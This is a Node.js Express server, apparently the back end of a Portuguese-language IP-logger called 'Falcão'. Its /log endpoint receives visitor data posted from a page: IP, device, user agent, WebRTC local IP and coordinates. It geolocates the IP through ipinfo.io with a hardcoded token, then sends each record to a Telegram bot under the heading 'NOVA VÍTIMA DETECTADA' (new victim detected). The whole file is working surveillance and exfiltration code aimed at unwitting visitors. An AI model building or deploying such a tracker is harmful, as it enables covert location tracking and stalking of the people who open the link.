const express = require('express');
const fetch = require('node-fetch');
const bodyParser = require('body-parser');
const app = express();
const PORT = process.env.PORT || 3000;

const botToken = process.env.BOT_TOKEN;
const chatId = process.env.CHAT_ID;

app.use(bodyParser.json());
app.use(express.static('public'));

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/index.html');
});

app.post('/log', async (req, res) => {
  const data = req.body;
  console.log("📥 Dados recebidos:", data);

  if (!botToken || !chatId) {
    console.error("❌ BOT_TOKEN ou CHAT_ID não definidos!");
    return res.status(500).send("Bot não configurado.");
  }

  let preciseLoc = null;

  try {
    const mlsRes = await fetch("https://location.services.mozilla.com/v1/geolocate?key=test", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ considerIp: true })
    });
    const mlsData = await mlsRes.json();
    preciseLoc = `${mlsData.location.lat},${mlsData.location.lng}`;
  } catch (mlsErr) {
    console.warn("⚠️ Mozilla Location Service falhou:", mlsErr);
  }

  try {
    const ipResponse = await fetch(`https://ipinfo.io/${data.ip}?token=c5633786f81824`);
    const ipInfo = await ipResponse.json();

    const mensagem = `
📡 NOVA VÍTIMA DETECTADA

🧠 ID: ${data.visitorId}
🌍 IP: ${data.ip}
📍 Localização: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}
🏢 ISP: ${ipInfo.org}
🕵️‍♂️ Agente: ${data.userAgent}
📱 Dispositivo: ${data.device}
📌 Lat/Long: ${data.loc || preciseLoc || ipInfo.loc}
🌐 IP Local (WebRTC): ${data.localIP || "N/A"}
    `;

    const telegramRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: mensagem
      })
    });

    const telegramResult = await telegramRes.json();
    if (!telegramResult.ok) {
      console.error("❌ Erro ao enviar pro Telegram:", telegramResult);
    } else {
      console.log("✅ Notificação enviada ao Telegram");
    }

    res.sendStatus(200);
  } catch (err) {
    console.error("❌ Erro no processo de rastreamento:", err);
    res.status(500).send("Erro interno no rastreamento.");
  }
});

app.listen(PORT, () => {
  console.log(`🦅 Falcão rodando em: http://localhost:${PORT}`);
});
